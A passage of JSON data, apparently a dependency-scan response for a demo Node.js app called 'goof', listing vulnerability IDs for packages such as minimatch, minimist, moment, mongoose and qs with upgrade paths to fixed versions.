        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:mime:20170907"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "mime@1.3.4:npm:mime:20170907",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "mime",
                "version": "1.3.4",
                "new_version": "1.4.1"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "mime@1.3.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:mime:20170907"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "minimatch@0.3.0:SNYK-JS-MINIMATCH-1019388",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "minimatch",
                "version": "0.3.0",
                "new_version": "3.0.2"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "minimatch@0.3.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MINIMATCH-1019388"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "minimatch@0.3.0:SNYK-JS-MINIMATCH-3050818",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "minimatch",
                "version": "0.3.0",
                "new_version": "3.0.5"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "minimatch@0.3.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MINIMATCH-3050818"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "minimatch@0.3.0:npm:minimatch:20160620",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "minimatch",
                "version": "0.3.0",
                "new_version": "3.0.2"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "minimatch@0.3.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:minimatch:20160620"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "minimatch@2.0.10:SNYK-JS-MINIMATCH-1019388",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "minimatch",
                "version": "2.0.10",
                "new_version": "3.0.2"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "minimatch@2.0.10"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MINIMATCH-1019388"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "minimatch@2.0.10:SNYK-JS-MINIMATCH-3050818",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "minimatch",
                "version": "2.0.10",
                "new_version": "3.0.5"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "minimatch@2.0.10"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MINIMATCH-3050818"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "minimatch@2.0.10:npm:minimatch:20160620",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "minimatch",
                "version": "2.0.10",
                "new_version": "3.0.2"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "minimatch@2.0.10"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:minimatch:20160620"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "minimatch@3.0.0:SNYK-JS-MINIMATCH-1019388",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "minimatch",
                "version": "3.0.0",
                "new_version": "3.0.2"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "minimatch@3.0.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MINIMATCH-1019388"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "minimatch@3.0.0:SNYK-JS-MINIMATCH-3050818",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "minimatch",
                "version": "3.0.0",
                "new_version": "3.0.5"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "minimatch@3.0.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MINIMATCH-3050818"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "minimatch@3.0.0:npm:minimatch:20160620",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "minimatch",
                "version": "3.0.0",
                "new_version": "3.0.2"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "minimatch@3.0.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:minimatch:20160620"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "minimatch@3.0.4:SNYK-JS-MINIMATCH-3050818",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "minimatch",
                "version": "3.0.4",
                "new_version": "3.0.5"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "minimatch@3.0.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MINIMATCH-3050818"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "minimist@0.0.10:SNYK-JS-MINIMIST-2429795",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "minimist",
                "version": "0.0.10",
                "new_version": "0.2.4"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "minimist@0.0.10"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MINIMIST-2429795"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "minimist@0.0.10:SNYK-JS-MINIMIST-559764",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "minimist",
                "version": "0.0.10",
                "new_version": "0.2.1"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "minimist@0.0.10"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MINIMIST-559764"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "minimist@0.0.8:SNYK-JS-MINIMIST-2429795",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "minimist",
                "version": "0.0.8",
                "new_version": "0.2.4"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "minimist@0.0.8"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MINIMIST-2429795"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "minimist@0.0.8:SNYK-JS-MINIMIST-559764",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "minimist",
                "version": "0.0.8",
                "new_version": "0.2.1"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "minimist@0.0.8"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MINIMIST-559764"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "minimist@1.2.0:SNYK-JS-MINIMIST-2429795",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "minimist",
                "version": "1.2.0",
                "new_version": "1.2.6"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "minimist@1.2.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MINIMIST-2429795"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "minimist@1.2.0:SNYK-JS-MINIMIST-559764",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "minimist",
                "version": "1.2.0",
                "new_version": "1.2.3"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "minimist@1.2.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MINIMIST-559764"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "moment@2.15.1:SNYK-JS-MOMENT-2440688",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "moment",
                "version": "2.15.1",
                "new_version": "2.29.2"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "moment@2.15.1"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MOMENT-2440688"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "moment@2.15.1:npm:moment:20161019",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "moment",
                "version": "2.15.1",
                "new_version": "2.15.2"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "moment@2.15.1"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:moment:20161019"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "moment@2.15.1:npm:moment:20170905",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "moment",
                "version": "2.15.1",
                "new_version": "2.19.3"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "moment@2.15.1"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:moment:20170905"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "mongodb@2.0.46:SNYK-JS-MONGODB-473855",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "mongodb",
                "version": "2.0.46",
                "new_version": "3.1.13"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "mongodb@2.0.46"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MONGODB-473855"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "mongoose@4.2.4:SNYK-JS-MONGOOSE-1086688",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "mongoose",
                "version": "4.2.4",
                "new_version": "5.12.2"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "mongoose@4.2.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MONGOOSE-1086688"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "mongoose@4.2.4:SNYK-JS-MONGOOSE-2961688",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "mongoose",
                "version": "4.2.4",
                "new_version": "5.13.15"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "mongoose@4.2.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MONGOOSE-2961688"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "mongoose@4.2.4:SNYK-JS-MONGOOSE-472486",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "mongoose",
                "version": "4.2.4",
                "new_version": "4.13.21"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "mongoose@4.2.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MONGOOSE-472486"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "mongoose@4.2.4:SNYK-JS-MONGOOSE-5777721",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "mongoose",
                "version": "4.2.4",
                "new_version": "5.13.20"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "mongoose@4.2.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MONGOOSE-5777721"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "mongoose@4.2.4:npm:mongoose:20160116",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "mongoose",
                "version": "4.2.4",
                "new_version": "4.3.6"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "mongoose@4.2.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:mongoose:20160116"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "mpath@0.1.1:SNYK-JS-MPATH-1577289",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "mpath",
                "version": "0.1.1",
                "new_version": "0.8.4"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "mpath@0.1.1"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MPATH-1577289"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "mquery@1.6.3:SNYK-JS-MQUERY-1050858",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "mquery",
                "version": "1.6.3",
                "new_version": "3.2.3"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "mquery@1.6.3"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MQUERY-1050858"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "mquery@1.6.3:SNYK-JS-MQUERY-1089718",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "mquery",
                "version": "1.6.3",
                "new_version": "3.2.5"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "mquery@1.6.3"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MQUERY-1089718"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "ms@0.6.2:npm:ms:20151024",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "ms",
                "version": "0.6.2",
                "new_version": "0.7.1"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "ms@0.6.2"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:ms:20151024"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "ms@0.6.2:npm:ms:20170412",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "ms",
                "version": "0.6.2",
                "new_version": "2.0.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "ms@0.6.2"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:ms:20170412"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "ms@0.7.1:npm:ms:20170412",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "ms",
                "version": "0.7.1",
                "new_version": "2.0.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "ms@0.7.1"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:ms:20170412"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "ms@0.7.3:npm:ms:20170412",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "ms",
                "version": "0.7.3",
                "new_version": "2.0.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "ms@0.7.3"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:ms:20170412"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "nconf@0.10.0:SNYK-JS-NCONF-2395478",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "nconf",
                "version": "0.10.0",
                "new_version": "0.11.4"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "nconf@0.10.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-NCONF-2395478"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "negotiator@0.2.8:npm:negotiator:20160616",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "negotiator",
                "version": "0.2.8",
                "new_version": "0.6.1"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "negotiator@0.2.8"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:negotiator:20160616"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "negotiator@0.4.9:npm:negotiator:20160616",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "negotiator",
                "version": "0.4.9",
                "new_version": "0.6.1"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "negotiator@0.4.9"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:negotiator:20160616"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "negotiator@0.5.3:npm:negotiator:20160616",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "negotiator",
                "version": "0.5.3",
                "new_version": "0.6.1"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "negotiator@0.5.3"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:negotiator:20160616"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "netmask@1.0.6:SNYK-JS-NETMASK-1089716",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "netmask",
                "version": "1.0.6",
                "new_version": "2.0.1"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "netmask@1.0.6"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-NETMASK-1089716"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "netmask@1.0.6:SNYK-JS-NETMASK-6056519",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "netmask",
                "version": "1.0.6",
                "new_version": "2.0.1"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "netmask@1.0.6"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-NETMASK-6056519"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "npmconf@0.0.24:npm:npmconf:20180512",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "npmconf",
                "version": "0.0.24",
                "new_version": "2.1.3"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "npmconf@0.0.24"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:npmconf:20180512"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "pac-resolver@3.0.0:SNYK-JS-PACRESOLVER-1564857",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "pac-resolver",
                "version": "3.0.0",
                "new_version": "5.0.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "pac-resolver@3.0.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-PACRESOLVER-1564857"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "parse-path@4.0.1:SNYK-JS-PARSEPATH-2936439",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "parse-path",
                "version": "4.0.1",
                "new_version": "5.0.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "parse-path@4.0.1"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-PARSEPATH-2936439"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "parse-url@5.0.1:SNYK-JS-PARSEURL-2935944",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "parse-url",
                "version": "5.0.1",
                "new_version": "6.0.1"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "parse-url@5.0.1"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-PARSEURL-2935944"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "parse-url@5.0.1:SNYK-JS-PARSEURL-2935947",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "parse-url",
                "version": "5.0.1",
                "new_version": "6.0.1"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "parse-url@5.0.1"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-PARSEURL-2935947"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "parse-url@5.0.1:SNYK-JS-PARSEURL-2936249",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "parse-url",
                "version": "5.0.1",
                "new_version": "6.0.1"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "parse-url@5.0.1"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-PARSEURL-2936249"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "parse-url@5.0.1:SNYK-JS-PARSEURL-2942134",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "parse-url",
                "version": "5.0.1",
                "new_version": "6.0.1"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "parse-url@5.0.1"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-PARSEURL-2942134"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "parse-url@5.0.1:SNYK-JS-PARSEURL-3023021",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "parse-url",
                "version": "5.0.1",
                "new_version": "8.1.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "parse-url@5.0.1"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-PARSEURL-3023021"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "parse-url@5.0.1:SNYK-JS-PARSEURL-3024398",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "parse-url",
                "version": "5.0.1",
                "new_version": "8.1.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "parse-url@5.0.1"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-PARSEURL-3024398"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "qs@1.2.2:SNYK-JS-QS-3153490",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "qs",
                "version": "1.2.2",
                "new_version": "6.2.4"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "qs@1.2.2"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-QS-3153490"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "qs@1.2.2:npm:qs:20170213",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "qs",
                "version": "1.2.2",
                "new_version": "6.0.4"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "qs@1.2.2"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:qs:20170213"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "qs@2.2.4:SNYK-JS-QS-3153490",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "qs",
                "version": "2.2.4",
                "new_version": "6.2.4"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "qs@2.2.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-QS-3153490"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "qs@2.2.4:npm:qs:20170213",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "qs",
                "version": "2.2.4",
                "new_version": "6.0.4"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "qs@2.2.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:qs:20170213"
          }
